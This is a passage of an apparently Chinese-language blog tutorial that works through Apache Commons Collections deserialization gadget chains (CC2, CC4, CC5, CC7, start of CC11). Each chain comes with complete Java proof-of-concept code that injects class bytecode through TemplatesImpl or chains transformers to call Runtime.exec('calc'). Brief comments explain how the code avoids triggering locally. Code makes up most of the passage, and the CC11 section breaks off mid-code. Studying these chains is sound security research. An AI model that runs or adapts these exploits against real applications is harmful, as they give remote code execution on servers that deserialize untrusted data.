class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>需要<code>commons-collections4</code>的依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>Calc</code>和加载恶意类与前面的一致</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC4Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/cn/evo1/cc/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        Field tfactory = tc.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates,new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line"><span class="comment">//        instantiateTransformer.transform(TrAXFilter.class);</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 与前面的CC链相同，防止本地执行，先放进去个ConstantTransformer</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 这里是为了满足priorityQueue.heapify中的(size &gt;&gt;&gt; 1)，从而能够进入for循环</span></span><br><span class="line">        priorityQueue.add(<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;evo2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 用反射放进去想用的chainedTransformer</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>没有用<code>chainedtrainsform</code>，而是直接用<code>invokertransformer</code>，避免了出现数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.TransformerConfigurationException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC2Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException, IOException, NoSuchFieldException, TransformerConfigurationException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;target/classes/cn/evo1/cc/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">//        templates.newTransformer();</span></span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformer</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformer.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformer.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>跟<code>CC6</code>很像，只是改成了使用<code>TiedMapEntry.toString</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">// 改成ConstantTransformer是为了防止put的时候就被使用</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap,<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="string">&quot;evo&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 防止在BadAttributeValueExpException初始化的时候就调TiedMapEntry.toString</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">bc</span> <span class="operator">=</span> badAttributeValueExpException.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> bc.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化的时候需要这个key来过掉LazyMap.get中的map.containsKey(key) == false</span></span><br><span class="line">        <span class="comment">// 但是序列化后这个key会被放进去，所以需要再去掉</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;evo1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 先传进来一个空的，防止在put里面的equals触发</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 在java中yy和zZ的hashCode是一样的</span></span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap1 = LazyMap.decorate(hashMap1,chainedTransformer);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; lazyMap2 = LazyMap.decorate(hashMap2,chainedTransformer);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> chainedTransformer.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(chainedTransformer,transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// LazyMap.get中会多生成一个yy</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        serialize(hashtable);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="CC11"><a href="#CC11" class="headerlink" title="CC11"></a>CC11</h1><blockquote><p><a href="http://wjlshare.com/archives/1536">CommonsCollections11 分析</a></p></blockquote><p>添加下依赖</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.javassist<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javassist<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.25.0-GA<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>具体分析可以看上面的链接</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.evo1.cc;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC11Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span 